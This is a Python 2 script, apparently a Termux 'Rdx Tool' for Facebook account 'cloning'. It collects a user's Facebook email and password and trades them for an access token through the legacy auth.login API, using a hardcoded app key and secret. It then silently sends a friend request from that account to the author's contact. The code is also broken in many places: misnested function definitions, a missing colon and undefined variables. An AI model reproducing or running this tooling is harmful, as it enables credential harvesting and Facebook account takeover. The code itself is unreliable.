╚══╝╚══╝╚══╝╚╝╚╝╚╝╚╝─╚╝╚╝╚══╝╚╝╚╝╚╝
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""
logo51 = """
\033[1;97m
╔══╗╔═══╗╔═══╗╔═══╗╔══╗╔╗───
╚╣─╝║╔═╗║║╔═╗║║╔═╗║╚╣─╝║║───
─║║─║╚══╗║╚═╝║║║─║║─║║─║║───
─║║─╚══╗║║╔╗╔╝║╚═╝║─║║─║║─╔╗
╔╣─╗║╚═╝║║║║╚╗║╔═╗║╔╣─╗║╚═╝║
╚══╝╚═══╝╚╝╚═╝╚╝─╚╝╚══╝╚═══╝
\033[1;97m«-----------------\033[1;97m Rdx\033[1;97m-----------------»"""
logo52 = """
\033[1;97m
╔══╗╔═══╗╔═══╗╔═╗─╔╗
╚╣─╝║╔═╗║║╔═╗║║║╚╗║║
─║║─║╚═╝║║║─║║║╔╗╚╝║
─║║─║╔╗╔╝║╚═╝║║║╚╗║║
╔╣─╗║║║╚╗║╔═╗║║║─║║║
╚══╝╚╝╚═╝╚╝─╚╝╚╝─╚═╝
\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"""

loop = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
loop = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
ugen2=[]
ugen=[]
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")

logo54=="""
		\033[1;91m     ♦♦♦———————————————————————————————♦♦♦
		\033[1;91m ,------. ,------. ,--.   ,--. 
		\033[1;91m |  .--. '|  .-.  \ \  `.'  /  
		\033[1;91m |  '--'.'|  |  \  : .'    \   
		\033[1;91m |  |\  \ |  '--'  //  .'.  \  
		\033[1;91m `--' '--'`-------''--'   '--' 
		\033[1;91m     ♦♦♦———————————————————————————————♦♦♦
		\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»
		("\033[1;97m•◈•───────•◈ IT'S NOT A NAME IT'S A BRAND •◈•───────•◈•") 
		("                  \033[1;93m Welcome to Rdx Tool ")"""

logo54=="""
		("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
		("\033[1;93m ▇▇\033[1;95m           WellCome to Rdx Tool   		 \033[1;93m▇▇")
		("\033[1;93m ▇▇\033[1;91m             👇Tool Using Tips👇            \033[1;93m▇▇")
		("\033[1;93m ▇▇\033[1;92m            Tool Update EveryDay      	  \033[1;93m▇▇")
		("\033[1;93m ▇▇\033[1;92m        Termux Data Clear EveryDay     \033[1;93m▇▇")
		("\033[1;93m ▇▇\033[1;92m         Facebook Id -- Rdx      			   \033[1;93m▇▇")
		("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
		 "\033[1;97m«-----------------\033[1;91mRdx\033[1;97m-----------------»"""

print(logo53)
print(logo54)

CorrectUsername = "Rdx"
CorrectPassword = "Rdx"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + Rdxuser #Dev:Rdx
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
    else:
        print "\033[1;97mWrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
        
        
        
        ##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo11
        print "\033[1;97m«-----------------\033[1;97mDisclaimer\033[1;97m---------------»"
        time.sleep(0.05)
        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mThis presentation is for educational          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mis your responsibility.I will not be          \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mheld accountable This Tool/Channel Doesn't    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mSupport illegal activities.for any illegal    \033[1;0m"
        time.sleep(0.05)
        print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
        time.sleep(0.05)
        print "\033[1;97m«-----------------\033[1;97mRdx\033[1;97m---------------»"
        time.sleep(0.05)
        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;96m Fast Cloning Without fb id \033[1;97m[New Update]"
        time.sleep(0.05)
        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;96m Old Id Cloning Without fb id \033[1;97m[New Update]"
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;93m Login only new Facebook ID "
        time.sleep(0.05)
        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;95m Login  Using Token Update by Rdx"
        time.sleep(0.05)
        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;97m Get Access Token App Fb"
        time.sleep(0.05)
        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94m Rdx   Serch On Youtube   "
        time.sleep(0.05)
        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;91mRdx  Serch On Facebook   "
        time.sleep(0.05)
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97m Exit             "
	pilih_login()
	
	
	def pilih_login():
	peak = raw_input("\n\033[1;97mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
        elif peak =="1":
		blackmafiax()
		elif peak=="2"
		rdx()
	elif peak =="3":
		login1()
        elif peak =="4":
	        tokenz()
        elif peak =="5":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
        elif peak =="6":
		os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
	        login()
        elif peak =="7":
	        os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;97m[!] Wrong input"
		keluar()
		
		def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan(' \033[1;97mWarning  \033[1;97mDo Not Use Your Personal Account' )
		jalan(' \033[1;97mWarning  \033[1;97mUse a New Account To Login' )
		jalan(' \033[1;97mWarning  \033[1;97mTermux All Version Work ' )                 
		print "\033[1;97m«-----------------\033[1;97mRdx\033[1;97m-----------------»"
		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
		print('ⓇDX-OK/CP' )
		id = raw_input('\033[1;97m[] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open https://https://www.youtube.com/channel/UC1uzo_2gduT9BG8zd8VVVew/videos')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
				except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
		try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toke)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
                
       except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
		print "\033[1;97mTotal IDs\033[1;97m: \033[1;97m"+str(len(id))
	jalan('\033[1;97mPlease Wait\033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m------------------»"
	
	